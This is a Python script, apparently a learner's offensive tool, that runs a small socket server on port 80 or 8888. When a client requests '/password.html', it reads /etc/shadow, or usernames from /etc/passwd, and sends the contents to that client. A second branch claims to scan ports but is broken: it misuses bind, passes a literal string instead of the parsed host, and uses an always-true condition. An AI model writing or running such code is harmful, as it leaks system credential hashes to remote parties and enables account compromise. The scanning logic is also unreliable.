import socket
#get the users from /etc/passwd.
def users():
    users = []
    with open("/etc/passwd","r") as file:
        for i in (file):
            users.append(i.split(":")[0])
        return users

#get passwords from /etc/shadow.
def passwords():
    #if we run the program as superUser we'll get the content of the file.
    password = []
    try:
        with open("/etc/shadow", "r") as file2:
            for i in (file2):
                password.append(i)
            return password
    #if we ain't superUser means that we can get the file, this return  False.
    except Exception as error:
        print(error)
        return False

#scanning ports
def scanPort(host):
    mySocket2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    ports = []
    for i in range (1,1024):
        try:
            mySocket2.bind((host, i))
            ports.append("OPEN:"+str(i))
            mySocket2.close()
        except:
            ports.append("CLOSED:"+str(i))
    return ports

#creating the socket.
try:
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    print("***Socket has been created***")
except socket.error as Error:
    print("Scoket couldn't be created Error:{}".format(Error))

#connection with port 80 or 8888, if we're superUser we'll connect to port 80, else we'll connect to port 8888.
def connPort(host):
    try:
        port = 80
        conn80 = mySocket.bind((host, port))
        print("You're connected to port: {}".format(port))
        return conn80
    except socket.error as sudo:
        print("Error with port 80: {}".format(sudo))
        port = 8888
        conn8888 = mySocket.bind((host, port))
        print("You're connected to port: {}".format(port))
        return conn8888

connPort("")#prove which port have connected with.
mySocket.listen(1)#put the socket in listen mode.

#while loop 
while True:
    client, add = mySocket.accept()
    msgHost = client.recv(1024)
    msgHost = msgHost.decode('utf-8')
    separate = msgHost.split("\n")
    url = separate[0]
    scanURL = url
    if url == "GET /password.html HTTP/1.1\r":
        client.send(b"GOOD: Page Password found")
        if passwords():
            Bytes = str.encode(str(passwords()),'utf-8')
            client.send(Bytes)
            print("passwords sent")
        else:
            Bytes = str.encode(str(users()),'utf-8')
            client.send(Bytes)
            print("users sent")
    elif url == scanURL:
        #Get the IP typed in the browser using the split() function
        url2 = url.split(' ')
        url2 = url2[1].split('?')
        getHost= url2[1]
        
        client.send(b"GOOD: Page Scan found")
        Bytes = str.encode(str(scanPort("getHost")),'utf-8')
        client.send(Bytes)
        print("Ports sent")
    else:
        client.send(b"WRONG: Page not Found")
    client.close()


#"GET /scan.html?192.168.1.1 HTTP/1.1\r"





